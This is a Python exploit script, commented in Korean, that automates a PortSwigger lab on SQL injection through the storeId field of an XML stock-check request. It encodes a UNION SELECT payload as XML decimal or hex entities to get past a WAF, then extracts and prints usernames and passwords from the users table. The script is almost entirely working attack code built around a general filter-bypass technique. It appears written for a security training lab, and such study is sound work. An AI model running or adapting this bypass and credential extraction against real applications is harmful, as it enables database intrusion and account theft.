#!/usr/bin/env python3
"""
SQL Injection with Filter Bypass via XML Encoding
PortSwigger Lab 018: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding

취약점 위치: POST /product/stock 의 XML 바디 내 storeId 필드
우회 방법:  SQL 키워드를 XML Decimal(&#N;) 또는 Hex(&#xN;) 엔티티로 인코딩
            WAF는 평문 UNION·SELECT를 탐지하지만 XML 엔티티 인코딩된 문자는 통과시킴
            DB는 XML 파싱 후 디코딩된 값을 SQL로 실행하므로 공격이 성립

요청 구조:
  POST /product/stock
  Content-Type: application/xml

  <?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>2</productId>
    <storeId>1 [인코딩된 페이로드]</storeId>
  </stockCheck>
"""

import argparse
import re
import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

STOCK_ENDPOINT = "/product/stock"


def xml_encode(text: str, mode: str = "decimal") -> str:
    """문자열의 각 문자를 XML 엔티티로 인코딩한다.

    WAF는 평문 SQL 키워드를 탐지하지만 XML 엔티티 인코딩된 문자는 통과시킨다.
    DB 측에서 XML 파싱 시 디코딩되므로 실제 SQL은 정상 실행된다.
    """
    if mode == "hex":
        return "".join(f"&#x{ord(char):02x};" for char in text)
    return "".join(f"&#{ord(char)};" for char in text)


def build_xml_body(product_id: int, store_id_value: str) -> str:
    """storeId에 페이로드를 삽입한 XML 바디를 생성한다."""
    return (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<stockCheck>"
        f"<productId>{product_id}</productId>"
        f"<storeId>{store_id_value}</storeId>"
        "</stockCheck>"
    )


def send_stock_request(
    session: requests.Session, url: str, xml_body: str, debug: bool = False
) -> requests.Response:
    """XML 바디로 재고 확인 POST 요청을 전송한다."""
    headers = {"Content-Type": "application/xml"}
    target = url + STOCK_ENDPOINT
    if debug:
        print(f"[DEBUG] POST → {target}")
        print(f"[DEBUG] Body → {xml_body[:120]}...")
    return session.post(
        target,
        data=xml_body,
        headers=headers,
        verify=False,
        timeout=10,
    )


def check_waf(session: requests.Session, url: str, product_id: int, debug: bool = False) -> None:
    """평문 UNION SELECT가 WAF에 차단되는지 확인한다."""
    raw_payload = "1 UNION SELECT username || '~' || password FROM users"
    xml_body = build_xml_body(product_id, raw_payload)
    resp = send_stock_request(session, url, xml_body, debug)
    if resp.status_code == 403:
        print("[+] WAF 차단 확인 (HTTP 403) — 인코딩 우회가 필요합니다.")
    else:
        print(f"[*] 평문 페이로드 응답: HTTP {resp.status_code}")
        print(f"[*] 응답 본문: {resp.text[:200]}")


def extract_credentials(
    session: requests.Session,
    url: str,
    product_id: int,
    encode_mode: str,
    debug: bool = False,
) -> list[str]:
    """XML 인코딩으로 WAF를 우회하여 users 테이블의 계정 정보를 추출한다."""
    # UNION SELECT 앞의 숫자를 0으로 두면 원본 쿼리 결과 없이 UNION 결과만 반환된다
    payload_text = "0 UNION SELECT username || '~' || password FROM users"
    encoded_payload = xml_encode(payload_text, mode=encode_mode)
    xml_body = build_xml_body(product_id, encoded_payload)

    print(f"[*] 인코딩 모드 : {encode_mode}")
    print(f"[*] 원본 페이로드: {payload_text}")
    print(f"[*] 인코딩 결과  : {encoded_payload[:100]}...")
    print()

    resp = send_stock_request(session, url, xml_body, debug)
    print(f"[*] HTTP {resp.status_code}")

    if debug:
        print(f"[DEBUG] 응답 본문:\n{resp.text}\n")

    if resp.status_code == 403:
        print("[-] 인코딩 후에도 WAF에 차단됨.")
        return []

    if resp.status_code != 200:
        print(f"[-] 예상치 못한 HTTP {resp.status_code} 응답.")
        if not debug:
            print("[*] --debug 옵션으로 응답 본문을 확인해보세요.")
        return []

    # 응답 본문에서 "username~password" 패턴 추출
    # JSON 응답: {"result":"administrator~password"} 형태도 처리
    raw = resp.text

    # 패턴 1: username~password 직접 포함
    matches = re.findall(r'([a-zA-Z0-9_]+~[A-Za-z0-9!@#$%^&*\-_+=]+)', raw)

    # 패턴 2: JSON result 필드 안에 포함된 경우
    if not matches:
        json_matches = re.findall(r'"result"\s*:\s*"([^"]+)"', raw)
        for value in json_matches:
            if "~" in value:
                matches.append(value)

    return matches


def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection — XML Filter Bypass 자동 추출기"
    )
    parser.add_argument("url", help="랩 URL (예: https://xxxx.web-security-academy.net)")
    parser.add_argument(
        "--encode",
        choices=["decimal", "hex", "both"],
        default="both",
        help="XML 인코딩 방식 — decimal: &#N;, hex: &#xN;, both: 둘 다 시도 (기본)",
    )
    parser.add_argument(
        "--product-id",
        type=int,
        default=2,
        help="요청에 사용할 productId (기본: 2)",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="응답 본문 전체를 출력한다",
    )
    args = parser.parse_args()

    from urllib.parse import urlparse
    parsed = urlparse(args.url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    session = requests.Session()

    print(f"[대상] {base_url}")
    print(f"[productId] {args.product_id}")
    print()

    print(f"[요청 URL] {base_url}{STOCK_ENDPOINT}")
    print()
    print("[1] WAF 탐지 확인 중 (평문 UNION SELECT 시도)...")
    check_waf(session, base_url, args.product_id, args.debug)
    print()

    encode_modes = ["decimal", "hex"] if args.encode == "both" else [args.encode]

    for mode in encode_modes:
        print(f"[2] XML {mode} 인코딩으로 우회 시도 중...")
        credentials = extract_credentials(
            session, base_url, args.product_id, mode, args.debug
        )

        if credentials:
            print()
            print(f"[+] 계정 정보 추출 성공 ({mode} 인코딩):")
            for credential in credentials:
                parts = credential.split("~", 1)
                if len(parts) == 2:
                    print(f"    username: {parts[0]}  /  password: {parts[1]}")
                else:
                    print(f"    {credential}")
            print()
            print("[+] administrator 계정으로 로그인하여 랩을 완료하세요.")
            return

        print(f"[-] {mode} 인코딩으로 추출 실패\n")

    print("[-] 모든 인코딩 방식으로 추출에 실패했습니다.")
    print("[*] --debug 옵션으로 응답 본문을 직접 확인하여 파싱 패턴을 조정하세요.")
    sys.exit(1)


if __name__ == "__main__":
    main()
